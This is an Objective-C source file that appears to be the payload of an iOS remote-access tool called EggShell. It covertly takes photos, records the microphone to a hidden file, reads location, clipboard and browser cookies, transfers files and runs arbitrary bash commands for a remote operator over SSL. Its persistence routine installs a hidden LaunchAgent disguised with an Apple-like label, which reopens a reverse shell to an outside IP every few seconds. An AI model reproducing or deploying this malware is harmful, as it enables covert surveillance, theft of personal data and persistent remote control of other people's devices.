//
//  espl.m
//  esplmacos
//
//  Created by Lucas Jackson on 8/7/17.
//  Copyright © 2017 neoneggplant. All rights reserved.
//

#include "espl.h"

@implementation espl

@synthesize fileManager;
NSPipe *stdinPipe;
bool sysTaskRunning = false;

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
    fileManager = [[NSFileManager alloc] init];
    [fileManager changeCurrentDirectoryPath:NSHomeDirectory()];
    _messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
    return self;
}


-(NSDictionary *)getDirectoryContents:(NSString *)path {
    NSMutableDictionary *results = [[NSMutableDictionary alloc] init];
    const char * searchDir= [path UTF8String];
    DIR *dp;
    struct dirent *ep;
    dp = opendir(searchDir);
    if (dp != NULL) {
        while ((ep = readdir(dp))) {
            [results setValue:[NSNumber numberWithUnsignedInteger:ep->d_type] forKey:[NSString stringWithFormat:@"%s",ep->d_name]];
        }
    } else {
        return nil;
    }
    return results;
}


-(void)listDirectory:(NSString *)path {
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
        if (isdir) {
            NSDictionary *results = [self getDirectoryContents:path];
            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:results options:0 error:nil];
            [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
        } else {
            [self sendString:[NSString stringWithFormat:@"%@: is a file",path]];
        }
    } else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",path]];
    }
    [self term];
}


-(void)tabComplete:(NSString *)path {
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:[self getDirectoryContents:path] options:0 error:nil];
    [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
    [self term];
}


-(void)showAlert:(NSString *)args {
    NSData *jsonData = [args dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableDictionary *uploadargs = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
    const char *title = [[NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"title"]] UTF8String];
    const char *message = [[NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"message"]] UTF8String];

    extern char *optarg;
    extern int optind;

    CFTimeInterval timeout = 0;
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryAddValue( dict, kCFUserNotificationAlertHeaderKey, CFStringCreateWithCString(NULL, title, kCFStringEncodingUTF8) );
    CFDictionaryAddValue( dict, kCFUserNotificationAlertMessageKey, CFStringCreateWithCString(NULL, message, kCFStringEncodingUTF8) );
    //CFDictionaryAddValue( dict, kCFUserNotificationIconURLKey, CFURLCreateWithString(NULL, CFSTR("/var/mobile/test.png"), NULL) );
    SInt32 error;
    CFOptionFlags flags = 0;
    flags |= kCFUserNotificationPlainAlertLevel;
    CFDictionaryAddValue( dict, kCFUserNotificationAlertTopMostKey, kCFBooleanTrue );
    CFNotificationCenterPostNotificationWithOptions( CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("test"),  NULL, NULL, kCFNotificationDeliverImmediately );
    CFUserNotificationCreate( NULL, timeout, flags, &error, dict );
    //CFOptionFlags options;
    //CFUserNotificationReceiveResponse( notif, 0, &options );
    //CFUserNotificationGetResponseDictionary(notif);
    [self term];
}


-(void)openURL:(NSString *)arg {
    if (![arg isEqualToString:@""]) {
        CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[arg UTF8String], strlen([arg UTF8String]), kCFStringEncodingUTF8, NULL);
        if(!cu) {
            [self sendString:@"Invalid URL"];
        }
        else {
            bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
            if (!ret) {
                [self sendString:[NSString stringWithFormat:@"Error opening url %@",arg]];
            }
        }
    }
    [self term];
}

//MARK: Picture Data
-(void)takePicture:(bool)front {    
    NSArray *devices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;

    for (AVCaptureDevice *device in devices) {
        if (front) {
            if (device.position == AVCaptureDevicePositionFront) {
                captureDevice = device;
                [self debugLog:[NSString stringWithFormat:@"weeeee got front"]];
            }
        } else {
            if (device.position == AVCaptureDevicePositionBack) {
                captureDevice = device;
                [self debugLog:[NSString stringWithFormat:@"weeeee got back"]];
            }
        }
    }
    if (captureDevice == nil) {
        [self sendString:@"{\"error\":\"Unable to activate camera\"}"];
        [self term];
        return;
    }

    //initialize session
    self.session = [[AVCaptureSession alloc] init];
    self.session.sessionPreset = AVCaptureSessionPresetMedium;
    //set input
    NSError *error = nil;
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:captureDevice error:&error];
    [self.session addInput:input];
    //set output
    [self debugLog:[NSString stringWithFormat:@"setting still image output"]];
    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
    
    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
    [self.stillImageOutput setOutputSettings:outputSettings];
    [self.session addOutput:self.stillImageOutput];
    //run
    [self.session startRunning];

    //take pic
    [NSThread sleepForTimeInterval:0.2];
    __block BOOL done = NO;
    __block NSData *bImageData;
    [self captureImageWithBlock:^(NSData *imageData)
     {
         if (imageData) {
             NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
             [result setValue:[NSNumber numberWithInt:(int)imageData.length] forKey:@"size"];
             [result setValue:[NSNumber numberWithInt:1] forKey:@"success"];
             NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
             [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
             [self term];
         } else {
             [self sendString:@"{\"status\":0}"];
         }
         bImageData = [[NSData alloc] initWithData:imageData];
         [self sendData:bImageData];
         done = true;
     }];
    while (!done)
        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];

    [self debugLog:[NSString stringWithFormat:@"done"]];
}


-(void)captureImageWithBlock:(void (^)(NSData *))imageData {    
    AVCaptureConnection* videoConnection = nil;

    for (AVCaptureConnection* connection in self.stillImageOutput.connections) {
        [self debugLog:[NSString stringWithFormat:@"scanned"]];
        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
        for (AVCaptureInputPort* port in [connection inputPorts]) {
            if ([[port mediaType] isEqual:AVMediaTypeVideo]) {
                videoConnection = connection;
                [self debugLog:[NSString stringWithFormat:@"we got the videoConnection!"]];
                break;
            }
        }
        if (videoConnection)
            break;
    }
    if (videoConnection == nil) {
        return imageData(nil);
    }
    
    //capture still image from video connection
    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
     {
         dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
            [self.session stopRunning];
         });
         
         if (error)
             imageData(nil);
         
         NSData* data = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
         if (data) {
             imageData(data);
         } else {
             imageData(nil);
         }
     }];
}


-(void)locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation *location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
    NSString *result = [NSString stringWithFormat:@"Latitude : %f\nLongitude : %f\nhttp://maps.google.com/maps?q=%f,%f",
        coordinate.latitude,
        coordinate.longitude,
        coordinate.latitude,
        coordinate.longitude];
    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
        result = @"Unable to get Coordinates\nAre location services enabled?";
    }
    [manager release];
    [self sendString:result];
    [self term];
}


-(void)getPid {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]];
    [self term];
}


-(void)getPasteBoard {
    UIPasteboard *pb  = [UIPasteboard generalPasteboard];
    NSString *contents = pb.string;
    if (contents == nil) {
        [self sendString:@"nil"];
    }
    [self sendString:contents];
    [self term];
}


-(void)getBattery {
    int batinfo=([_thisUIDevice batteryLevel]*100);
    [self sendString:[NSString stringWithFormat:@"Battery Level: %d ",batinfo]];
    [self term];
}


-(void)getVolume {
    //TODO: fix this from pausing
    [[AVAudioSession sharedInstance] setActive:YES error:nil];
    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
    [self sendString:[NSString stringWithFormat:@"%.2f",[AVAudioSession sharedInstance].outputVolume]];    
    [self term];
}


-(void)setVolume:(NSString *)args {
    MPVolumeView* volumeView = [[MPVolumeView alloc] init];
    //find the volumeSlider
    UISlider* volumeViewSlider = nil;
    for (UIView *view in [volumeView subviews]){
        if ([view.class.description isEqualToString:@"MPVolumeSlider"]){
            volumeViewSlider = (UISlider*)view;
            break;
        }
    }
    [volumeViewSlider setValue:[args floatValue] animated:YES];
    [volumeViewSlider sendActionsForControlEvents:UIControlEventTouchUpInside];
    [self term];
}


-(void)vibrate {
    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
    [self term];
}


-(void)bundleIds {
    NSString *result = @"";
    char buf[1024];
    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
    CFIndex i;
    for(i = 0; i < CFArrayGetCount(ary); i++) {
        CFStringGetCString(CFArrayGetValueAtIndex(ary, i),buf, sizeof(buf), kCFStringEncodingUTF8);
        result = [NSString stringWithFormat:@"%@%s\n",result,buf];
        printf("%s\n", buf);
    }
    [self sendString:result];
    [self term];
}


-(void)screenshot {
   UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
   NSData *imageData = UIImagePNGRepresentation(image);
   [self debugLog:[NSString stringWithFormat:@"%@",imageData]];
   [self term];
}

    
-(void)ipod:(NSString *)args {
    if ([args isEqualToString:@"play"]) {
        [[MPMusicPlayerController systemMusicPlayer] play];
    } else if ([args isEqualToString:@"pause"]) {
        [[MPMusicPlayerController systemMusicPlayer] pause];
    } else if ([args isEqualToString:@"next"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToNextItem];
    } else if ([args isEqualToString:@"prev"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToPreviousItem];
    } else if ([args isEqualToString:@"info"]) {
        float time1 = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        [NSThread sleepForTimeInterval:0.1];
        float time2 = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        if (time1 != time2) {
            MPMediaItem *song = [[MPMusicPlayerController systemMusicPlayer] nowPlayingItem];
            NSString * title   = [song valueForProperty:MPMediaItemPropertyTitle];
            NSString * album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
            NSString * artist  = [song valueForProperty:MPMediaItemPropertyArtist];
            NSString *mpstatus = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f\n",title,album,artist,time2];
            [self sendString:mpstatus];
        } else {
            [self sendString:@"Not Playing"];
        }
    }
    [self term];
}


-(void)openApp:(NSString *)arg {
    CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [arg UTF8String], kCFStringEncodingUTF8);
    assert(identifier != NULL);
    int ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
    if (ret != 0) {
        [self sendString:@"Cannot open app, is device locked?"];
    }
    CFRelease(identifier);
    [self term];
}


-(void)say:(NSString *)string {
    AVSpeechUtterance *utterance = [AVSpeechUtterance speechUtteranceWithString:string];
    utterance.rate = 0.4;
    AVSpeechSynthesizer *syn = [[[AVSpeechSynthesizer alloc] init]autorelease];
    [syn speakUtterance:utterance];
    [self term];
}


-(void)getProcessId {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]];
    [self term];
}


-(void)sysinfo {
    UIDevice *device = [UIDevice currentDevice];
    int batinfo=([_thisUIDevice batteryLevel]*100);
    NSString *info = [NSString stringWithFormat:@"Model: %@\nBattery: %d\nSystem Version: %@ %@\nDevice Name: %@\nUUID: %@\n",
                      [device model],
                      batinfo,
                      [device systemName],
                      [device systemVersion],
                      [device name],
                      [[device identifierForVendor] UUIDString]];
    [self sendString:info];
    [self term];
}


-(void)mic:(NSString *)arg {
    if ([arg isEqualToString:@"record"]) {
        NSError *initMicError = nil;
        [self initmic:initMicError];
        if (initMicError) {
            [self sendString:initMicError.localizedDescription];
        } else {
            NSString *file = @"/tmp/.avatmp";
            [self.fileManager removeItemAtPath:file error:NULL];
            [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
            
            NSString *destinationString = file;
            NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
            NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
                                         AVEncoderAudioQualityKey: @(AVAudioQualityHigh),
                                         AVNumberOfChannelsKey: @1,
                                         AVSampleRateKey: @22050.0f};
            [[AVAudioSession sharedInstance] setActive:YES error:nil];
            self.audioRecorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
            self.audioRecorder.meteringEnabled = true;
            self.audioRecorder.delegate = self;
            
            [self.audioRecorder prepareToRecord];
            [self.audioRecorder record];
            [self sendString:@"Listening..."];
        }
    } else if ([arg isEqualToString:@"stop"]) {
        if ([self.audioRecorder isRecording]) {
            [self.audioRecorder stop];
            //send confirmation
            [self sendString:@"{\"status\":1}"];
            } else {
            [self sendString:@"{\"error\":\"Not currently recording\"}"];
        }
    }
    [self term];
}


-(void)initmic:(NSError *)error {
    NSURL *soundFile;
    NSDictionary *soundSetting;
    soundFile = [NSURL fileURLWithPath: @"/tmp/.avatmp"];
    soundSetting = [NSDictionary dictionaryWithObjectsAndKeys:
                    [NSNumber numberWithFloat: 44100.0],AVSampleRateKey,
                    [NSNumber numberWithInt: kAudioFormatMPEG4AAC],AVFormatIDKey,
                    [NSNumber numberWithInt: 2],AVNumberOfChannelsKey,
                    [NSNumber numberWithInt: AVAudioQualityHigh],AVEncoderAudioQualityKey, nil];
    self.audioRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: &error];
}

    
-(AVCaptureDevice *)initcamera:(bool)front {
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionFront){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}

//MARK: Data Handling
char lastBytes[64];
char* parseBinary(int* searchChars,int sizeOfSearch) {
    NSString *cookieJarPath = [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",NSHomeDirectory()];
    FILE *cookieJar = fopen([cookieJarPath UTF8String], "rb+");
    fseek(cookieJar, 0L, SEEK_END);
    long cookieJarSize = ftell(cookieJar);
    int pos = 0; int curSearch = 0;int curChar;
    fseek(cookieJar, 0, 0);
    
    while(pos <= cookieJarSize) {
        curChar = getc(cookieJar);pos++;
        
        if(curChar == searchChars[curSearch]) { /* found a match */
            curSearch++;                        /* search for next char */
            if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
                curSearch = 0;                  /* start searching again */
                fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
                return lastBytes;
            }
            
        } else { /* didn't find a match */
            if (curSearch > 18) {
                printf("fuck %d\n",searchChars[curSearch]);
            }
            curSearch = 0;                     /* go back to searching for first char */
        }
    };
    return "null";
}


-(void)sendFile:(NSString *)path {
    BOOL isDir;
    if ([self.fileManager fileExistsAtPath:path isDirectory:&isDir]) {
        if (isDir) {
            [self sendString:@"{\"status\":2}"];
            [self term];
        } else {
            NSData *data = [self.fileManager contentsAtPath:path];
            NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
            [result setValue:[NSNumber numberWithInt:(int)data.length] forKey:@"size"];
            [result setValue:[NSNumber numberWithInt:1] forKey:@"status"];
            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
            [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
            [self term];
            [self sendData:data];
        }
    } else {
        [self sendString:@"{\"status\":0}"];
        [self term];
    }
}


-(void)sendData:(NSData *)data {
    NSString *end = [self receiveString:10];
    SSL_write(client_ssl, [data bytes], (int)data.length);
    SSL_write(client_ssl, [end UTF8String], (int)end.length);
}


-(void)receiveFile:(NSString *)args {
    NSData *jsonData = [args dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableDictionary *uploadargs = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
    long size = [[uploadargs valueForKey:@"size"] integerValue];
    NSString *uploadPath = [NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"path"]];
    NSString *fileName = [NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"filename"]];
    NSData *data = [self receiveData:size];
    [data writeToFile:[NSString stringWithFormat:@"%@/%@",uploadPath,fileName] atomically:true];
}


-(NSData *)receiveData:(long)size {
    NSMutableData *data = [NSMutableData alloc];
    char buffer[1024] = "";
    while (SSL_read(client_ssl, &buffer, sizeof(buffer))) {
        [data appendBytes:buffer length:sizeof(buffer)];
        if (strstr(buffer,terminator)) {
            break;
        }
        memset(buffer,'\0',1024);
    };
    [self debugLog:[NSString stringWithFormat:@"data size = %lu",(unsigned long)[data subdataWithRange:NSMakeRange(0, size)].length]];
    return [data subdataWithRange:NSMakeRange(0, size)];
}


//MARK: Navigation
-(void)changeDirectory:(NSString *)dir {
    NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
    NSString *path = NSHomeDirectory();
    if (![dir isEqual: @""]) {
        path = dir;
    }
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
        if (isdir) {
            [fileManager changeCurrentDirectoryPath:path];
            [result setValue:[fileManager currentDirectoryPath] forKey:@"current_directory"];
        } else {
            [result setValue:[NSString stringWithFormat:@"%@: Not a directory\n",path] forKey:@"error"];
        }
    } else {
        [result setValue:[NSString stringWithFormat:@"%@: No such file or directory\n",path] forKey:@"error"];
    }
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
    [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
    [self term];
}



-(void)killTask {
    if (sysTaskRunning) {
        sysTaskRunning = false;
        [_systask terminate];
    }
    [self term];
}


-(void)runTask:(NSString *)cmd :(bool)sendTerm {
    if (sysTaskRunning) {
        //if sys task is running, write to stdin filehandle
        [stdinPipe.fileHandleForWriting writeData:[cmd dataUsingEncoding:NSUTF8StringEncoding]];
    } else {
            //dispatch to allow future killswitch
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                //split cmd by ";" run each separately (this isn't ideal - while true; do echo smh; done)
                NSArray *cmdArray = [cmd componentsSeparatedByString:@";"];
                NSEnumerator *e = [cmdArray objectEnumerator];
                id object;
                sysTaskRunning = true;
                while ((object = [e nextObject]) && sysTaskRunning) {
                    NSLog(@"running task %@",object);
                    _systask = [[NSTask alloc] init];
                    [_systask setLaunchPath:@"/bin/bash"];
                    [_systask setArguments:@[ @"-c", object]];
                    [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
                    
                    NSPipe *stdoutPipe = [NSPipe pipe];
                    stdinPipe = [NSPipe pipe];
                    [_systask setStandardInput:stdinPipe];
                    [_systask setStandardOutput:stdoutPipe];
                    [_systask setStandardError:stdoutPipe];
                    NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
                    [stdoutHandle waitForDataInBackgroundAndNotify];
                    id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                                                    object:stdoutHandle queue:nil
                                                                                usingBlock:^(NSNotification *note)
                                   {
                                       NSData *dataRead;
                                       while((dataRead = [stdoutHandle availableData]) && dataRead.length > 0) {
                                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
                                           [self sendString:newOutput];
                                       }
                                       [stdoutHandle waitForDataInBackgroundAndNotify];
                                   }];
                    [_systask launch];
                    [_systask waitUntilExit];
                    [[NSNotificationCenter defaultCenter] removeObserver:observer];
                }
                if (sysTaskRunning) {
                    if (sendTerm) {
                        [self term];
                    }
                    sysTaskRunning = false;
                }
            });
    }
}


-(void)rocketMC:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo] == false) {
        [self sendString:@"You dont have eggshellPro Extension"];
    }
    [self term];
}


-(void)rocketMCWithReply:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply" userInfo:userInfo];
    NSString *replystr = [reply objectForKey:@"returnStatus"];
    [self sendString:replystr];
    [self term];
}

    
-(void)debugLog:(NSString *)string {
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:@"/tmp/esplog"];
    [fileHandle seekToEndOfFile];
    [fileHandle writeData:[string dataUsingEncoding:NSUTF8StringEncoding]];
    [fileHandle closeFile];
}


-(void)persistence:(NSString *)args :(NSString *)ip :(int)port {
    NSString *esplPath = @"/Library/LaunchAgents/.espl.plist";
    if ([args isEqualToString:@"install"]) {
        NSDictionary *innerDict = [NSDictionary dictionaryWithObjects:
                        [NSArray arrayWithObjects: [NSNumber numberWithBool: YES],@"com.apple.espl",[NSNumber numberWithInt:5],[NSNumber numberWithBool: YES],
                         [NSArray arrayWithObjects:@"sh",@"-c",[NSString stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1",ip,port], nil], nil]
                        forKeys:[NSArray arrayWithObjects:@"AbandonProcessGroup",@"Label",@"StartInterval",@"RunAtLoad",@"ProgramArguments", nil]];
        NSError *err = nil;
        NSData *plistData = [NSPropertyListSerialization dataWithPropertyList:innerDict format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
        if (err != nil) {
            [self debugLog:[NSString stringWithFormat:@"persistence error>%@<\n",err]];
            [self sendString:@"error"];
            [self term];
            return;
        }
        [plistData writeToFile:esplPath atomically:true];
        [self runTask:@"sleep 1;launchctl unload /Library/LaunchAgents/.espl.plist 2>/dev/null;;launchctl load /Library/LaunchAgents/.espl.plist 2>/dev/null;":false];
    } else if ([args isEqualToString:@"uninstall"]) {
        if ([self.fileManager fileExistsAtPath:esplPath]) {
            [self runTask:@"launchctl unload /Library/LaunchAgents/.espl.plist 2>/dev/null; rm /Library/LaunchAgents/.espl.plist 2>/dev/null;":false];
        }
    } else {
        [self sendString:@"Unknown Option"];
    }
    [self term];
}



-(void)term {
    SSL_write(client_ssl, terminator, (int)strlen(terminator));
}


-(void)sendString:(NSString *)str {
    SSL_write(client_ssl, [str UTF8String], (int)str.length);
}


-(NSString *)receiveString:(int)length {
    char buffer[length];
    SSL_read(client_ssl, &buffer, length + 1);
    NSString *result = [NSString stringWithFormat:@"%s",buffer];
    memset(buffer,'\0',length);
    return result;
}

@end
